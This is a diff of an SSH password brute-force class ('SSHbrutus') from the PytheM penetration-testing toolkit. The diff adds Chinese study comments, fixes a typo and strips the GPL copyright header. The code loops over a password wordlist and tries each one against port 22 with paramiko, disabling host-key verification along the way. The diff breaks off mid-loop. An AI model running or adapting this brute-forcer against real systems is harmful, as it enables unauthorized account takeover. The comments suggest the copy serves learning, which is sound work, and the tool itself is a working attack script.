@@ -1,29 +1,10 @@
-#!/usr/bin/env python2.7
-#coding=UTF-8
+#!/usr/local/bin/python
+#coding=utf-8
 
-# Copyright (c) 2016 Angelo Moura
-#
-# This file is part of the program PytheM
-#
-# PytheM is free software; you can redistribute it and/or
-# modify it under the terms of the GNU General Public License as
-# published by the Free Software Foundation; either version 3 of the
-# License, or (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful, but
-# WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
-# General Public License for more details.
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
-# USA
-
-import paramiko
 import sys
 import os
 import socket
-
+import paramiko
 
 class SSHbrutus(object):
 
@@ -34,20 +15,30 @@ class SSHbrutus(object):
 	def __init__ (self, target, username ,file):
 
 		self.target = target
+		# 这里只传入用户名。密码在后面`ssh_connect()`方法中作为参数传入
 		self.username = username
 		self.file = file
 		self.line = "\n------------------------------------------------------------------\n"
 
 		if os.path.exists(file) == False:
-			print "\n[!] Path to wordlist don't exist."
+			print "\n[!] Path to wordlist does't exist."
 
 
 	def ssh_connect(self,password, code = 0):
+		'''
+		默认code为0，代表一切ok，若出错，则返回对应的出错码
+		'''
 		ssh = paramiko.SSHClient()
+		'''这句话注释掉就会报错。
+		原因是因为使用ssh连接一个新机器的时候会弹出一段对话询问yes/no，如果选择yes,那么连接的主机信息就会产生一个密钥存放在~/.ssh/known_hosts中。
+		set_missing_host_key_policy()就是避免这个问题的，不需要对连接主机进行密钥验证的。
+		当然也可以通过其他方法。
+		'''
 		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 		try:
 			ssh.connect(self.target, port=22, username=self.username, password=password)
+		# 注意可能会出现哪些Exception
 		except paramiko.AuthenticationException:
 			code = 1
 		except socket.error, e:
@@ -59,6 +50,7 @@ class SSHbrutus(object):
 		input_file = open(self.file)
 		print ""
 		for i in input_file.readlines():
+			# 因为在readline()之后得到的是包含\n的str类型，需要先将\n去掉
 			password = i.strip("\n")
 			try:
 				response = self.ssh_connect(password)
